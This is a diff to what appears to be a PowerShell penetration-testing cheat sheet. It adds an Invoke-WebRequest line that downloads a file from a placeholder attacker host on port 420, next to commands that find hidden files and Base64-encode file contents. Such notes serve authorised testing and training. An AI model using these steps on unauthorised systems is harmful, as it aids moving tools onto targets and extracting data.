@@ -6296,6 +6296,10 @@ Get-ChildItem . -Force
 GCI -hidden
 type <FILE> | findstr /l <STRING>
 [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
+Invoke-WebRequest -Uri http://<IP>:420/<FILENAME> -OutFile <FILENAME>        // download a file
+
+
+
 ```
 
 ##### Allow Script Execution
